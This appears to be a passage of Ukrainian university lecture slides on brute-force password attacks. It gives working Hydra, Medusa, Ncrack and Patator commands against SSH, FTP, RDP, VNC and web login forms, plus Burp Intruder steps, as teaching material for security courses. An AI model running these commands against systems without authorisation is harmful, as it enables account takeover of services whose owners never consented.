Тема 6.4 — Брутфорс та атаки на паролі

Кафедра ТЕІБ, Ужгородський національний університет

THC-Hydra — універсальний онлайн-крекер

THC-Hydra підтримує 50+ протоколів: SSH, FTP, RDP, VNC, SMB, HTTP, MySQL, MSSQL, PostgreSQL, SMTP, POP3, IMAP, LDAP, Telnet, та інші.
# SSH брутфорс
hydra -l admin -P rockyou.txt ssh://192.168.1.100

# FTP з кількома логінами
hydra -L users.txt -P passwords.txt ftp://target

# RDP (Remote Desktop)
hydra -l administrator -P wordlist.txt rdp://target

# VNC (без логіна)
hydra -s 5900 -P passwords.txt vnc://target

# HTTP POST форма
hydra -l admin -P rockyou.txt target http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid"

Ключові параметри

  • -l/-L — логін (файл)
  • -p/-P — пароль (файл)
  • -t — потоки (16 за замовч.)
  • -w — таймаут
  • -f — зупинка після першого збігу
  • -V — verbose режим
  • -o — вивід у файл

Обмеження

  • Швидкість: ~100-300 спроб/сек (SSH)
  • IDS/IPS детекція великої кількості запитів
  • Account lockout після N невдалих спроб
  • Rate limiting на сервері
  • CAPTCHA на веб-формах

Medusa та Ncrack

Medusa

Модульна архітектура

Стабільніший за Hydra для паралельних хостів

# SSH брутфорс
medusa -h target -u admin \
  -P rockyou.txt -M ssh

# FTP паралельно по хостах
medusa -H hosts.txt -u root \
  -P wordlist.txt -M ftp -T 5

# Combo файл (host:user:pass)
medusa -C combo.txt -M ssh
Підтримує: SSH, FTP, HTTP, MSSQL, MySQL, POP3, SMB, Telnet, VNC

Ncrack

Від розробників Nmap

Оптимізований для мережевого аудиту

# SSH з Nmap результатами
ncrack -iX nmap_scan.xml \
  -U users.txt -P passwords.txt

# RDP з таймінгом
ncrack -p 3389 --user admin \
  -P wordlist.txt target \
  -T 4

# FTP
ncrack ftp://target \
  -U users.txt -P pass.txt
Підтримує: SSH, RDP, FTP, Telnet, HTTP, SMB, VNC
Інтеграція з Nmap: Ncrack може імпортувати результати сканування Nmap XML і автоматично проводити брутфорс лише на відкритих портах.

HTTP форми та Burp Suite Intruder

Веб-форми — найпоширеніша мішень. Потрібно визначити: URL, метод (POST/GET), параметри, маркер помилки.
# Hydra: HTTP POST форма
hydra -l admin -P rockyou.txt target \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"

# Hydra: HTTP Basic Auth
hydra -l admin -P rockyou.txt target http-get /admin/

# Patator: модульний підхід
patator http_fuzz url=http://target/login method=POST \
  body='user=admin&pass=FILE0' 0=rockyou.txt \
  -x ignore:fgrep='Invalid'

Burp Suite Intruder

  1. Перехопити запит логіну через Proxy
  2. Надіслати до Intruder (Ctrl+I)
  3. Позначити параметр пароля як §payload§
  4. Вибрати тип: Sniper (1 параметр), Cluster Bomb (всі комбінації)
  5. Завантажити словник і запустити
  6. Аналіз: довжина відповіді або статус-код
Примітка: Безкоштовна версія Burp Community — дуже повільна (1 запит/сек). Для брутфорсу краще Hydra або Patator.
